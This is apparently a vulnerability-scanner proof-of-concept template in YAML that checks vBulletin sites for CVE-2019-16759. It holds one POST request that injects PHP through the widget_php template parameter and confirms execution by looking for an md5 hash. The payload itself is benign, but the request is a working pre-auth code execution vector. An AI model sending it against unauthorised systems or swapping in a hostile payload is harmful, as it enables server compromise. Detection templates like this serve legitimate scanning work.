name: yaml-poc-vbulletin-vbulletin-other-CVE-2019-16759
binding: 80574ad7-6064-4167-8209-6a729125dc53
detail:
    author: Ð¡z
    links:
        - http://packetstormsecurity.com/files/154623/vBulletin-5.x-0-Day-Pre-Auth-Remote-Command-Execution.html
        - http://packetstormsecurity.com/files/154648/vBulletin-5.x-Pre-Auth-Remote-Code-Execution.html
        - http://packetstormsecurity.com/files/155633/vBulletin-5.5.4-Remote-Command-Execution.html
        - http://packetstormsecurity.com/files/158829/vBulletin-5.x-Remote-Code-Execution.html
        - http://packetstormsecurity.com/files/158830/vBulletin-5.x-Remote-Code-Execution.html
        - http://packetstormsecurity.com/files/158866/vBulletin-5.x-Remote-Code-Execution.html
        - http://seclists.org/fulldisclosure/2020/Aug/5
        - https://arstechnica.com/information-technology/2019/09/public-exploit-code-spawns-mass-attacks-against-high-severity-vbulletin-bug/
        - https://cxsecurity.com/issue/WLB-2020080066
        - https://nvd.nist.gov/vuln/detail/CVE-2019-16759
        - https://packetstormsecurity.com/files/154623/vBulletin-5.x-0-Day-Pre-Auth-Remote-Command-Execution.html
        - https://packetstormsecurity.com/files/154648/vBulletin-5.x-Pre-Auth-Remote-Code-Execution.html
        - https://packetstormsecurity.com/files/155633/vBulletin-5.5.4-Remote-Command-Execution.html
        - https://packetstormsecurity.com/files/158829/vBulletin-5.x-Remote-Code-Execution.html
        - https://packetstormsecurity.com/files/158830/vBulletin-5.x-Remote-Code-Execution.html
        - https://packetstormsecurity.com/files/158866/vBulletin-5.x-Remote-Code-Execution.html
        - https://seclists.org/fulldisclosure/2019/Sep/31
        - https://www.exploit-db.com/exploits/47437
        - https://www.theregister.co.uk/2019/09/24/vbulletin_vbug_zeroday/
    vulnerability:
        id: a41dbdac-678e-40bb-ab45-0e608713cf21
        level: critical
    warning: Harmless
transport: http
set:
    s1: randomInt(100000, 999999)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /ajax/render/widget_tabbedcontainer_tab_panel
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: subWidgets[0][template]=widget_php&subWidgets[0][config][code]=md5({{s1}});
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(md5(string(s1)))
expression: r0()
